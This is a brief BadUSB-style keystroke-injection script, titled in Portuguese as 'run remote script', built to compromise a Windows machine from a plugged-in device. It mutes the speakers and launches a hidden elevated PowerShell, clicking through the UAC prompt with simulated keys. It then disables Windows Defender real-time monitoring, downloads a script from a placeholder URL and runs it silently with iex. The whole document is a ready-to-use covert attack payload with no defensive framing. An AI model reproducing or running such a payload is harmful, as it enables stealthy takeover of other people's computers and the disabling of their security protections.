# Rodar Script Remoto
```bash
Delay 1000
GuiR
## Inicia Silenciado (Zera Volume Antes de Iniciar)
WinPrintLine powershell -w h -c "$s=New-Object -ComObject WScript.Shell;1..50|%{$s.SendKeys([char]174)};start powershell -v runas"
Delay 1000
Press KEY_LEFT_ALT
Press Y
Release
Delay 2000
Press KEY_LEFT_ARROW
PressRelease KEY_ENTER
Release
Delay 1000

WinPrintLine Set-MpPreference -DisableRealtimeMonitoring $true

## Definir URL do Script

WinPrintLine $u='URL-SCRIPT';
WinPrintLine $d=New-Object Net.WebClient; $f='t.ps1';$d.DownloadFile($u,$f); powershell -w h -c "gc $f -Raw|iex";
```
